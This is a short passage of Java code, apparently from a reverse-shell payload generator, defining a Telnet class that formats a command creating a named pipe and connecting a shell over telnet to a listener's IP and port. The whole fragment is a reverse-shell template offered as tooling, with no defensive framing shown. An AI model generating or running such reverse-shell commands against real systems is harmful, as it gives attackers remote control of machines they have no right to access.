    ...
    public class Telnet extends Reverse {

        protected String shellFormat = "";

        public Telnet(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("TF=$(mktemp -u);mkfifo $TF && telnet %s %s 0<$TF | %s 1>$TF",this.getLocalIP() ,this.getLocalPort(), this.getShell());
        }
